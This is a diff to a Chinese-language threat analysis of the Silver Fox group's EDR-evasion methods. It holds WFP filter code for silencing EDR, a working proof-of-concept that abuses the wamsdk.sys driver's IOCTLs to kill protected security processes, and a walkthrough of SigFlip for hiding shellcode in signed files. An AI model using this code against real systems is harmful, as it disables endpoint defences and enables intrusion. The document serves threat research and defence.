@@ -76,7 +76,7 @@ pythonmemorymodule.MemoryModule(data=data)
 
 以下是基于 EDRSilencer 核心逻辑的代码片段，展示了如何配置 WFP 过滤器以阻断特定进程的流量：
 
-```c
+```cpp
 // 设置过滤器显示名称（用于 netsh wfp show filters 等管理命令）
 filter.displayData.name = filterName;
 
@@ -140,3 +140,117 @@ if (result == ERROR_SUCCESS) {
     printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
 }
 ```
+
+## BYOVD
+
+**BYOVD (Bring Your Own Vulnerable Driver)** 是一种利用合法签名但存在漏洞的驱动程序来实现内核级攻击的技术。由于 Windows 驱动程序运行在 Ring 0（内核态），拥有最高的系统权限，攻击者无需自己编写驱动（这通常会被驱动签名强制执行机制拦截），而是直接携带一个已被微软签名的、但存在已知漏洞的合法驱动。加载该驱动后，攻击者便可利用其漏洞实现以下目标：
+
+*   任意内核内存读写
+*   关闭或绕过 EDR/AV 的内核回调 (Kernel Callbacks)
+*   提权至 SYSTEM 权限
+*   隐藏恶意进程或文件
+
+要判断一个 `.sys` 驱动是否存在可利用空间，通常可以检查其 IOCTL 处理程序是否调用了以下内核函数且未做严格的权限校验：
+
+*   `ZwOpenProcess`：获取进程句柄
+*   `ZwTerminateProcess`：终止进程
+*   `ZwWriteVirtualMemory`：破坏进程内存
+*   `ZwAllocateVirtualMemory`：分配内存（通常配合写入使用）
+*   `MmCopyVirtualMemory`：拷贝内存（可用于破坏进程内存）
+
+银狐自诞生之初就在不断利用漏洞驱动与杀软/EDR 进行对抗。可以肯定的是，他们拥有独立的研究团队，并持续发掘潜在的 BYOVD 资源。无论是从开源项目还是其他渠道获取，其利用的漏洞驱动数量极高，且相当一部分是未知的，或者尚未被收录在 [LOLDrivers](https://www.loldrivers.io/) 项目中。
+
+### wamsdk.sys
+
+根据 Check Point 在 2025 年 8 月发布的[报告](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)，银狐利用了 **WatchDog Antimalware** 软件中的 `wamsdk.sys` 驱动，通过调用 `ZwTerminateProcess` 来强制结束 EDR/杀软进程。两个月后，安全研究员 j3h4ck 在 GitHub 上开源了此驱动的 POC：[WatchDogKiller](https://github.com/j3h4ck/WatchDogKiller)。截至 10 月份，此漏洞驱动尚未被 LOLDrivers 和微软的漏洞驱动阻止列表（Microsoft Vulnerable Driver Blocklist）收录。
+
+`wamsdk.sys` 暴露了两个具有严重安全缺陷的 IOCTL：
+
+| IOCTL | Code | 功能 |
+| :--- | :--- | :--- |
+| `IOCTL_REGISTER_PROCESS` | `0x80002010` | 注册进程到授权白名单 |
+| `IOCTL_TERMINATE_PROCESS` | `0x80002048` | 终止任意进程 |
+
+**漏洞解析：**
+
+1.  `IOCTL_REGISTER_PROCESS` 存在严重逻辑缺陷，任何进程都可以将自己的 PID 注册到白名单中，**且无任何权限校验**。
+
+    ![alt text](1.png)
+
+2.  即便 `IOCTL_TERMINATE_PROCESS` 内部有 `ZmnAuthIsRegisteredProcessId` 授权检查，攻击者只需先完成第一步注册，即可轻松绕过。
+
+    ![alt text](2.png)
+
+3.  驱动最终以内核权限调用 `ZwTerminateProcess`，这将绕过所有用户态保护机制（包括 PPL 保护进程）。
+
+    ![alt text](3.png)
+
+至此，该驱动可以在开启了 HVCI (Hypervisor-Protected Code Integrity) 的最新版 Windows 11 机器上成功运行。下面是 POC 的关键代码片段：
+
+```cpp
+// ========== Step 1: 注册自己到白名单（绕过授权检查） ==========
+DWORD pid = GetCurrentProcessId();
+DeviceIoControl(
+    hDevice,
+    0x80002010,          // IOCTL_REGISTER_PROCESS
+    &pid, sizeof(pid),   // 只需传入自己的 PID，无任何校验！
+    NULL, 0, &bytesReturned, NULL
+);
+
+// ========== Step 2: 杀掉任意目标进程 ==========
+typedef struct {
+    DWORD ProcessId;     // 目标 PID
+    DWORD WaitForExit;   // 是否等待退出
+} TERMINATE_REQUEST;
+
+TERMINATE_REQUEST req = { targetPid, 0 };
+DeviceIoControl(
+    hDevice,
+    0x80002048,          // IOCTL_TERMINATE_PROCESS  
+    &req, sizeof(req),   // 内核态 ZwTerminateProcess，无视 PPL 保护
+    NULL, 0, &bytesReturned, NULL
+);
+```
+
+## SigFlip
+
+**SigFlip** 利用了 Windows Authenticode 签名机制的一个设计特性：允许在不破坏数字签名有效性的情况下，向已签名的 PE 文件中嵌入任意数据。
+
+这一特性与 `WIN_CERTIFICATE` 结构有关：
+
+```c
+typedef struct _WIN_CERTIFICATE {
+    DWORD dwLength;           // 证书表大小
+    WORD  wRevision;          // 版本
+    WORD  wCertificateType;   // 证书类型
+    BYTE  bCertificate[];     // 实际证书数据（PKCS#7 SignedData）
+} WIN_CERTIFICATE;
+```
+
+SigFlip 的核心原理是在 `bCertificate` 字段后面追加数据（Padding）。由于这部分数据不参与哈希计算，因此不会破坏签名的完整性。具体流程如下：
+
+1.  加载 PE 文件并验证现有签名。
+2.  定位 `IMAGE_DIRECTORY_ENTRY_SECURITY`（Optional Header 中的安全目录）。
+3.  获取证书表的 RVA (Relative Virtual Address) 和 Size。
+4.  在证书表末尾追加自定义数据（如 Shellcode 或加密配置）。
+5.  更新 `WIN_CERTIFICATE.dwLength` 和目录项的 Size。
+6.  重新计算并更新 PE 文件的 Checksum。
+
+银狐利用此工具来绕过基于哈希的检测机制（例如安全厂商通过拉黑易受攻击驱动的文件哈希来防御 BYOVD）。通过制造同一驱动的不同变种（Hash 不同但签名依然有效），银狐将 BYOVD 漏洞驱动的生命周期利用到了极致。此外，这种技术也可用于其他“白利用”场景。
+
+开源工具 [gSigFlip](https://github.com/akkuman/gSigFlip) 提供了现成的 CLI 程序，可用于快速生成改造过的签名 PE 文件：
+
+```powershell
+Usage of gSigFlip.exe:
+  -out string
+        output pe file path (default "out.exe")
+  -pe string
+        pe file path which you want ot hide data
+  -sf string
+        the path of the file where shellcode is stored
+  -tag string
+        the tag you want to use, support "\x1a \xdf" "\x1a\xdf" "1a, df" "1a df" (default "fe ed fa ce fe ed fa ce")
+  -xor string
+        the xor key you want to use
+```
+
